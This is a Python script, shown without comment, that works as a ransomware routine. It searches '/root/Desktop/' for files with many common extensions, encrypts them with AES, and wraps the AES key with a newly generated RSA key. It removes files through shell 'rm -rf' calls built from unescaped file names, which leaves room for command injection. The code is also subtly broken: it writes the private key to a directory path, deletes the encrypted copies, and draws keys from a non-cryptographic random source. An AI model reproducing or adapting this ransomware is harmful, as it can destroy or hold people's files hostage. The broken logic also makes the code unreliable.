import os
import random
import struct

from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

extensions_of_files = ['.pdf', '.txt', '.doc', '.docx', '.otc', '.tex', '.wks', '.wps', '.gif', '.dbf',
                       '.jar', '.exe', '.com', '.tar', '.sql', '.mdb', '.avi', '.flv', '.mkv', '.bmp',
                       '.mov', '.mp4', '.vob', '.wmv', '.mpg', '.mpeg', '.m4v', '.cer', '.ai', '.cur',
                       '.jpeg', '.jpg', '.ps', '.svg', '.tmp', '.dll', '.ico', '.sys', '.msi', '.key',
                       '.pl', '.xlsx', '.xls', '.ods', '.vb', '.swift', '.sh', '.java', '.h', '.db', '.rb',
                       '.cpl', '.bak', '.cfg', '.conf', '.jsp', '.odp', '.pps', '.ppt', '.pptx', '.cs',
                       '.cpp', '.c', '.php', '.html', 'css', 'xml', '.py', '.js', '.log', '.tar.gz', '.csv',
                       '.bin', '.iso', '.zip', '.rar', '.7z', '.deb', '.pkg', '.rpm', '.png', '.z', '.ogg',
                       '.mpa', '.wav', '.wma', 'wpl', '.msg', 'htm', '.gzip', '.odt,']


def generate_rsa_key():
    rsa_key = RSA.generate(2048, Random.new().read)
    rsa_public_key = rsa_key.publickey().exportKey('PEM')
    rsa_private_key = rsa_key.exportKey('PEM')
    pub_key = open('pub_key.pem', 'wb')
    pub_key.write(rsa_public_key)
    pub_key.close()
    priv_key = open('/root/Desktop/', 'wb')
    priv_key.write(rsa_private_key)
    priv_key.close()


def generate_aes_key_and_iv():
    aes_key = open('aes_key.txt', 'wb')
    aes_key.write("".join(chr(random.randint(0, 255)) for i in range(16)))
    aes_key.close()
    iv = "".join(chr(random.randint(0, 255)) for i in range(16))
    return iv


def cipher_aes_key(aes_key):
    pub_key = open('pub_key.pem', 'rb')
    cipher = PKCS1_OAEP.new(RSA.importKey(pub_key.read()))
    pub_key.close()
    key_aes = open(aes_key, 'rb')
    key_aes_enc = open(aes_key + ".enc", "wb")
    key_aes_enc.write(cipher.encrypt(key_aes.read(16)))
    key_aes.close()
    os.system("rm -rf " + aes_key + " " + 'pub_key.pem' + "")
    key_aes_enc.close()


def decipher_aes_key(aes_key_enc):
    path_to_priv_key = input("path to the private key : \n")
    priv_key = open(path_to_priv_key)
    cipher = PKCS1_OAEP.new(RSA.importKey(priv_key.read()))
    priv_key.close()
    s_pli = aes_key_enc.split('.')
    ase_key = s_pli[0] + '.' + s_pli[1]
    key_aes_enc = open(ase_key, "rb")
    key_aes = open(ase_key, "wb")
    key_aes.write(cipher.decrypt(key_aes_enc.read()))
    key_aes.close()
    key_aes_enc.close()
    os.system("rm -rf " + aes_key_enc + "")


def get_all_files(path):
    found_files = list()
    for path_to_file, dirr, file_found in os.walk(path):
        for files in file_found:
            file_extention = os.path.splitext(os.path.join(path_to_file, files))[1]
            if file_extention in extensions_of_files:
                found_files.append(os.path.join(path_to_file, files))
    return found_files


def encrypt_file_with_aes(aes_key, input_file, vector_init, buffer):
    size_of_file = os.path.getsize(input_file)
    file_in = open(input_file, 'rb')
    file_out = open(str(os.path.join(input_file)) + ".enc", "wb")
    file_out.write(struct.pack('<Q', size_of_file))
    file_out.write(vector_init)
    cipher = AES.new(aes_key, AES.MODE_CBC, vector_init)
    while 1:
        buff = file_in.read(buffer)
        if len(buff) == 0:
            break
        if len(buff) % 16 != 0:
            buff += ' ' * (16 - len(buff) % 16)
        ciph = cipher.encrypt(buff)
        file_out.write(ciph)
    file_in.close()
    file_out.close()


def decrypt_file_with_aes(aes_key, input_file, buffer):
    file_in = open(input_file, 'rb')
    size_of_file = struct.unpack('<Q', file_in.read(struct.calcsize('Q')))[0]
    vector_init = file_in.read(16)
    decipher = AES.new(aes_key, AES.MODE_CBC, vector_init)
    file_out = open(str(os.path.splitext(input_file)[0]), 'wb')
    while 1:
        buff = file_in.read(buffer)
        if len(buff) == 0:
            break
        buff_dec = decipher.decrypt(buff)
        if size_of_file > len(buff_dec):
            file_out.write(buff_dec)
        else:
            file_out.write(buff_dec[: size_of_file])
        size_of_file = size_of_file - len(buff_dec)
    file_in.close()
    file_out.close()


def main():
    path = '/root/Desktop/'
    iv = generate_aes_key_and_iv()
    lsite_of_file = get_all_files(path)

    for i in range(len(lsite_of_file)):
        key_a = open('aes_key.txt', 'rb')
        encrypt_file_with_aes(key_a.read(16), lsite_of_file[i], iv, 1024)
        lsite_of_file[i] = lsite_of_file[i] + ".enc"
        key_a.close()
        os.system("rm -rf " + lsite_of_file[i] + "")

    generate_rsa_key()
    cipher_aes_key('aes_key.txt')

    decipher_aes_key('aes_key.txt.enc')
    for i in range(len(lsite_of_file)):
        key_a = open('aes_key.txt', 'rb')
        decrypt_file_with_aes(key_a.read(16), lsite_of_file[i], 1024)
        key_a.close()
        os.system("rm -rf " + lsite_of_file[i] + "")


main()
